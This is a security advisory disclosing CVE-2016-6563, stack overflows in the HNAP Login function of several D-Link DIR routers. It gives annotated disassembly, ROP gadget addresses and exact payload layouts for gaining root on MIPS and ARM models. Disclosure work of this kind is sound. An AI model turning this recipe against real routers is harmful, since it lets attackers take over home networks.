@@ -1,0 +1,204 @@
+>> Multiple vulnerabilities in Dlink DIR routers HNAP Login function (multiple routers affected)
+>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security
+==========================================================================
+Disclosure: 07/11/2016 / Last updated: 07/11/2016
+
+>> Background on the affected products:
+"Smartphones, laptops, tablets, phones, Smart TVs, game consoles and more – all being connected at the same time. That’s why we created the new AC3200 Ultra Wi-Fi Router. With Tri-Band Technology and speeds up to 3.2Gbps, it delivers the necessary ultra-performance to power even the most demanding connected homes, making it the best wireless home router for gaming."
+
+
+>> Summary:
+Dlink routers expose a protocol called HNAP (Home Network Administration Protocol) on the LAN interface. This is a SOAP protocol that allows identification, configuration, and management of network devices. It seems Dlink uses an implementation of this protocol to communicate with the router's web interface over the LAN. For more information regarding HNAP, see [1] and [2].
+
+Dlink has a long history of vulnerabilities in HNAP. Craig Heffner in particular seems to have found a lot of them (see [3], [4], [5], [6], [7], [8]).
+
+This new vulnerability occurs in the processing of XML tags inside SOAP messages when performing the HNAP Login action. The affected function contains two subsequent stack overflows, which can be exploited by an unauthenticated attacker on the LAN. It affects a number of Dlink routers which span the ARM and MIPS architectures. A Metasploit module that exploits this vulnerability for both architectures has been released [9].
+
+A special thanks to CERT/CC and Trent Novelly for help with disclosing this vulnerability to the vendor. Please refer to CERT's advisory [10].
+
+
+>> Technical details:
+Vulnerability: Stack buffer overflow
+CVE-2016-6563
+Attack Vector: Remote
+Constraints: Can be exploited by an unauthenticated attacker. See below for other constraints.
+Affected versions:
+  The following MIPS devices have been confirmed to be vulnerable:
+    DIR-823 
+    DIR-822
+    DIR-818L(W)
+    
+  The following ARM devices have been confirmed to be vulnerable:
+    DIR-895L
+    DIR-890L
+    DIR-885L
+    DIR-880L
+    DIR-868L -> Rev. B and C only
+    
+  There might be other affected devices which are not listed above.
+  
+-----------------------
+Vulnerability details and MIPS exploitation
+-----------------------
+
+The vulnerable function, parse_xml_value (my name, not a symbol), is called from hnap_main (a symbol in the binary) in /htdocs/cgibin.
+This function takes 3 arguments: the first is the request object / string, the second is the XML tag name to be parsed inside the request, and the third is a pointer to where the value of that tag should be returned.
+
+The function tries to find the tag name inside the request object and then extracts the tag value, copying it first to a local variable and then to the third argument. This function is called from hnap_main when performing the HNAP Login action to obtain the values of Action, Username, LoginPassword and Catpcha from the SOAP request shown above.
+
+parse_xml_value(char* request, char* XMLtag, char* tag_value)
+(...)
+.text:00412264     xml_tag_value_start = $s2
+.text:00412264     xml_tag_value_end = $s1
+.text:00412264 C30                 addu    xml_tag_value_start, $v0, $s0  # s2 now points to <Action>$value</Action>
+.text:00412268 C30                 la      $t9, strstr
+.text:0041226C C30                 move    $a1, xml_tag_value_end  # needle
+.text:00412270 C30                 jalr    $t9 ; strstr
+.text:00412274 C30                 move    $a0, xml_tag_value_start  # haystack
+.text:00412278 C30                 lw      $gp, 0xC30+var_C20($sp)
+.text:0041227C C30                 beqz    $v0, loc_4122BC
+.text:00412280 C30                 subu    xml_tag_value_end, $v0, xml_tag_value_start  # s1 now holds the ptr to <Action>value$</Action>
+.text:00412284 C30                 bltz    xml_tag_value_end, loc_4122BC
+.text:00412288 C30                 addiu   $s0, $sp, 0xC30+xml_tag_var
+.text:0041228C C30                 la      $t9, strncpy
+.text:00412290 C30                 move    $a2, xml_tag_value_end  # n
+.text:00412294 C30                 move    $a1, xml_tag_value_start  # src
+.text:00412298 C30                 addu    xml_tag_value_end, $s0, xml_tag_value_end
+.text:0041229C C30                 jalr    $t9 ; strncpy    # copies all chars in <Action>$value$</Action> to xml_tag_var using strncpy
+.text:004122A0 C30                 move    $a0, $s0         # dest
+.text:004122A4 C30                 move    $a0, a2_ptr      # a2_ptr is a stack variable from hnap_main (passed as third argument to parse_xml_value)
+.text:004122A8 C30                 lw      $gp, 0xC30+var_C20($sp)
+.text:004122AC C30                 move    $a1, $s0         # src
+.text:004122B0 C30                 la      $t9, strcpy	# copies xml_tag_var into a2_ptr using strcpy
+.text:004122B4 C30                 jalr    $t9 ; strcpy     # the stack of the calling function (hnap_main) is thrashed if 2408+ bytes are sent
+.text:004122B8 C30                 sb      $zero, 0(xml_tag_value_end)
+(...)
+
+There are two overflows, therefore two choices for exploitation:
+1) The local stack (on parse_xml_value) can be overrun with 3096+ bytes. This overflow occurs even though strncpy is used, because the argument to strncpy is simply the strlen of the value inside the XML tag.
+2) Alternatively, it's possible to overrun the stack of the calling function (hnap_main), using only 2408+ bytes - this is because strcpy is used to copy the xml_tag_var onto the third argument received by parse_xml_value, which is a pointer to a stack variable in hnap_main. 
+
+Exploiting 1) is easier, and the following example will explain how.
+
+All the affected MIPS devices use the same version of uClibc (libuClibc-0.9.30.3.so) and seem to load it at 0x2aabe000, which makes exploitation trivial for all firmware versions. It should be noted that the MIPS devices use the RTL8881a CPU, which is based on a Lextra RLX5281 core. The Lextra RLX cores are MIPS clones, but they're bit crippled as they are lacking a few load and store instructions. For this reason, some generic shellcodes that work on MIPS might not work on these CPUs (especially when obfuscated).
+
+The devices also do not have NX, ASLR nor any other modern memory protections, so the shellcode is executed directly on the stack. However, it's necessary to use ROP to prepare the stack for execution, which can be executed with gadgets taken from libuClibc-0.9.30.3.so.
+Due to the way MIPS CPUs work, it's necessary to flush the CPU cache before executing the exploit. This can be forced by calling sleep() from libc (refer to http://blog.emaze.net/2011/10/exploiting-mips-embedded-devices.html for an explanation on the MIPS CPU caches).
+
+So the ROP chain and shellcode will look like:
+
+first_gadget - execute sleep and call second_gadget
+.text:0004EA1C                 move    $t9, $s0 <- sleep()
+.text:0004EA20                 lw      $ra, 0x20+var_4($sp) <- second_gadget
+.text:0004EA24                 li      $a0, 2 <- arg for sleep()
+.text:0004EA28                 lw      $s0, 0x20+var_8($sp)
+.text:0004EA2C                 li      $a1, 1
+.text:0004EA30                 move    $a2, $zero
+.text:0004EA34                 jr      $t9 
+.text:0004EA38                 addiu   $sp, 0x20
+
+second_gadget - puts stack pointer in a1:
+.text:0002468C                 addiu   $s1, $sp, 0x58
+.text:00024690                 li      $s0, 0x44
+.text:00024694                 move    $a2, $s0
+.text:00024698                 move    $a1, $s1
+.text:0002469C                 move    $t9, $s4
+.text:000246A0                 jalr    $t9
+.text:000246A4                 move    $a0, $s2
+
+third_gadget - call $a1 (which now has the stack pointer):
+.text:00041F3C                 move    $t9, $a1
+.text:00041F40                 move    $a1, $a2
+.text:00041F44                 addiu   $a0, 8
+.text:00041F48                 jr      $t9
+.text:00041F4C                 nop
+
+When the crash occurs, the stack pointer is at xml_tag_value[3128]. In order to have a larger space for the shellcode (3000+ bytes), it's possible to jump back to xml_tag_value[0].
+  prep_shellcode_1 =  23bdf3c8 		# addi	sp,sp,-3128
+  prep_shellcode_2 =  03a0f809 		# jalr	sp
+  branch_delay =		  2084f830 	  # addi	a0,a0,-2000 (NOP executed as a MIPS branch delay slot)
+
+The final Action / Username / LoginPassword / Catpcha XML parameter value will be:
+shellcode + 'a' * (3072 - shellcode.size) + sleep() + '1' * 4 + '2' * 4 + '3' * 4 + third_gadget + first_gadget + 'b' * 0x1c + second_gadget + 'c' * 0x58 + prep_shellcode_1 + prep_shellcode_2 + branch_delay
+
+'a', 'b' and 'c' are just fillers to make up the buffer, while '1111', '2222' and '3333' will be the values of s1, s2 and s3 registers (which are not interesting for exploitation), and the rest is the ROP chain, shellcode and stack preparation routine. The only bad character that cannot be sent in the payload is the null byte as this is a str(n)cpy overflow. Up to 3350 characters can be sent, as after that it's hard to control the overflow in a reliable way. Note that all of this is to exploit the first buffer overflow with strncpy, but the second buffer overflow can be exploited in a similar way.
+
+As explained above, due to the use of a crippled MIPS core, generic shellcodes found on the Internet will likely fail. Some very simple ones work, but the best is to craft a reliable one. The simple Metasploit bind shell also seems to work pretty reliably if no encoder is used.
+
+-----------------------
+ARM exploitation
+-----------------------
+
+The same two stack overflows affect ARM, but require less bytes to overflow the stack. The following snippet is the same part of parse_xml_value as shown for MIPS (taken from firmware 2.03b01 for the DIR-868 Rev. B):
+.text:00018F34 C30 LDR             R1, [R11,#src] ; src
+.text:00018F38 C30 LDR             R2, [R11,#n] ; n
+.text:00018F3C C30 SUB             R3, R11, #-xml_tag_var
+.text:00018F40 C30 SUB             R3, R3, #4
+.text:00018F44 C30 SUB             R3, R3, #4
+.text:00018F48 C30 MOV             R0, R3  ; dest
+.text:00018F4C C30 BL              strncpy ; first overflow occurs here (xml_tag_var in parse_xml_stack) with 1024+ characters
+.text:00018F50 C30 MOV             R3, #0xFFFFFBEC
+.text:00018F58 C30 LDR             R2, [R11,#n]
+.text:00018F5C C30 SUB             R1, R11, #-var_4
+.text:00018F60 C30 ADD             R2, R1, R2
+.text:00018F64 C30 ADD             R3, R2, R3
+.text:00018F68 C30 MOV             R2, #0
+.text:00018F6C C30 STRB            R2, [R3] 
+.text:00018F70 C30 SUB             R3, R11, #-xml_tag_var
+.text:00018F74 C30 SUB             R3, R3, #4
+.text:00018F78 C30 SUB             R3, R3, #4
+.text:00018F7C C30 LDR             R0, [R11,#a2_ptr] ; a2_ptr is is a stack variable from hnap_main
+.text:00018F80 C30 MOV             R1, R3  ; src
+.text:00018F84 C30 BL              strcpy  ; second overflow occurs here
+
+The stack size will be smaller for both parse_xml_value and hnap_main when compared to the MIPS binary. This time again it's easier to exploit the easier strncpy overflow in parse_xml_value, but only 1024 bytes are enough to overflow the stack. As with the MIPS exploit, the only bad character is the null byte.
+
+The affected ARM devices have a non-executable stack (NX) and 32 bit ASLR. NX can be defeated with ROP, and the 32 bit ASLR is weak - there are only 3 bytes that change in the address calculations, which means there are only 4096 possible values. The attack has to be run several times until the correct base address is hit, but this can usually be achieved in less than 1000 attempts.
+
+The easiest attack to perform is a return-to-libc to execute a command with system(). To do this, R0 must point to the stack location where the command is before system() is called. All the affected ARM devices seem to use the same version of uClibc (libuClibc-0.9.32.1.so) for all firmware versions, which makes gadget hunting much easier and allows building an exploit that works on all the devices without any modification.
+
+first_gadget (pops system() address into r3, and second_gadget into PC):
+.text:00018298                 LDMFD           SP!, {R3,PC}
+
+second_gadget (puts the stack pointer into r0 and calls system() at r3): 
+.text:00040CB8                 MOV             R0, SP
+.text:00040CBC                 BLX             R3
+
+system() (Executes argument in r0 (our stack pointer)
+.text:0005A270 system
+
+The final Action / Username / LoginPassword / Catpcha XML parameter value will be:
+'a' * 1024 + 0xffffffff + 'b' * 16 + 'AAAA' + first_gadget + system() + second_gadget + command
+
+a / b = filler
+0xffffffff = integer n (see below)
+AAAA = R11
+first_gadget = initial PC
+payload = stack points here after execution of our ROP chain; it should point to whatever we want system() to execute
+
+When the overflow happens, the stack var "n" is overwritten, which is used to calculate a memory address (see 0x18F58). In order not to crash the process before the shellcode is executed, the variable needs to be set to a numeric value that can be used to calculate a valid memory address. A good value to choose is 0xffffffff, as this will just subtract 1 from the calculated memory address and prevent an invalid memory access.
+
+From this point onwards, it's possible to execute any command in "payload". For example, wget can be used to download a shell and execute it or a telnet server can be started. All commands will be executed as root.
+
+
+>> Fix:
+Dlink did not respond to my or CERT's request for information, so no firmware fix is available at the time of writing.
+Given that this vulnerability can only be exploited in the LAN, it is recommended to have a strong wireless password to prevent untrusted clients from connecting to the router.
+
+
+>> References:
+[1] https://isc.sans.edu//diary/More+on+HNAP+-+What+is+it,+How+to+Use+it,+How+to+Find+it/17648 
+[2] https://en.wikipedia.org/wiki/Home_Network_Administration_Protocol
+[3] http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/
+[4] http://www.devttys0.com/2015/04/what-the-ridiculous-fuck-d-link/
+[5] http://www.devttys0.com/2014/05/hacking-the-d-link-dsp-w215-smart-plug/
+[6] https://packetstormsecurity.com/files/134370/D-Link-DIR-818W-Buffer-Overflow-Command-Injection.html
+[7] https://dl.packetstormsecurity.net/papers/attack/dlink_hnap_captcha.pdf
+[8] http://www.dlink.com/uk/en/support/support-news/2015/april/13/hnap-privilege-escalation-command-injection
+[9] 
+[10] https://www.kb.cert.org/vuls/id/677427
+
+================
+Agile Information Security Limited
+http://www.agileinfosec.co.uk/
+>> Enabling secure digital business >>
